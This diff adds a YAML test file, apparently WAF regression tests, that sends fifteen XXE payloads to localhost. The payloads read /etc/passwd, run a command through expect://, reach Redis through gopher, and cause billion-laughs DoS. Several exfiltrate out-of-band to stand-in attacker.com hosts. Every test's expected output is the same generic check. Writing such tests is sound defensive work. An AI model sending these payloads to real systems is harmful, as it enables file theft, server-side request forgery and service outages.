@@ -1,0 +1,232 @@
+---
+meta:
+  author: "Security Engineer"
+  description: "Comprehensive XXE test cases (REQUEST-910)"
+  enabled: true
+  name: "910-xxe-comprehensive.yaml"
+tests:
+  - test_id: 910100
+    desc: "Classic XXE with SYSTEM entity"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>"
+          output:
+            log_contains: "id"
+  - test_id: 910101
+    desc: "XXE via SOAP body"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/soap"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/soap+xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
+          output:
+            log_contains: "id"
+  - test_id: 910102
+    desc: "XXE via SVG upload"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/upload"
+            headers:
+              Host: "localhost"
+              Content-Type: "image/svg+xml"
+            data: "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>"
+          output:
+            log_contains: "id"
+  - test_id: 910103
+    desc: "Blind XXE with OOB via HTTP"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; ]><data>&send;</data>"
+          output:
+            log_contains: "id"
+  - test_id: 910104
+    desc: "XXE with parameter entities"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE test [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\"> %eval; %error; ]><test></test>"
+          output:
+            log_contains: "id"
+  - test_id: 910105
+    desc: "XXE DoS (Billion Laughs)"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE lolz [ <!ENTITY lol \"lol\"> <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"> ]><lolz>&lol2;</lolz>"
+          output:
+            log_contains: "id"
+  - test_id: 910106
+    desc: "XXE via XInclude"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+          output:
+            log_contains: "id"
+  - test_id: 910107
+    desc: "XXE with PHP expect wrapper"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"expect://id\"> ]><foo>&xxe;</foo>"
+          output:
+            log_contains: "id"
+  - test_id: 910108
+    desc: "XXE with gopher protocol"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_INFO\"> ]><foo>&xxe;</foo>"
+          output:
+            log_contains: "id"
+  - test_id: 910109
+    desc: "Unicode XXE bypass UTF-16"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml; charset=utf-16"
+            data: "\xFF\xFE<\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00\"\x001\x00.\x000\x00\"\x00?\x00>\x00<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00f\x00o\x00o\x00 \x00[\x00 \x00<\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00x\x00x\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00\"\x00f\x00i\x00l\x00e\x00:\x00/\x00/\x00/\x00e\x00t\x00c\x00/\x00p\x00a\x00s\x00s\x00w\x00d\x00\"\x00>\x00 \x00]\x00>\x00<\x00f\x00o\x00o\x00>\x00&\x00x\x00x\x00e\x00;\x00<\x00/\x00f\x00o\x00o\x00>\x00"
+          output:
+            log_contains: "id"
+  - test_id: 910110
+    desc: "Blind XXE via FTP"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE test [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"ftp://attacker.com/file.dtd\"> %dtd; ]><test>&send;</test>"
+          output:
+            log_contains: "id"
+  - test_id: 910111
+    desc: "XXE via DTD injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"> <!ENTITY % expr 'aaa)> <!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd; ]><root></root>"
+          output:
+            log_contains: "id"
+  - test_id: 910112
+    desc: "Blind XXE via DNS"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://dnslog.attacker.com/xxe\"> %remote; ]><root></root>"
+          output:
+            log_contains: "id"
+  - test_id: 910113
+    desc: "XXE with external DTD"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/xml"
+            headers:
+              Host: "localhost"
+              Content-Type: "application/xml"
+            data: "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://attacker.com/evil.dtd\"><root></root>"
+          output:
+            log_contains: "id"
+  - test_id: 910114
+    desc: "XXE via multipart/form-data"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            uri: "/api/upload"
+            headers:
+              Host: "localhost"
+              Content-Type: "multipart/form-data; boundary=boundary"
+            data: "--boundary\r\nContent-Disposition: form-data; name=\"xmlfile\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>\r\n--boundary--"
+          output:
+            log_contains: "id"
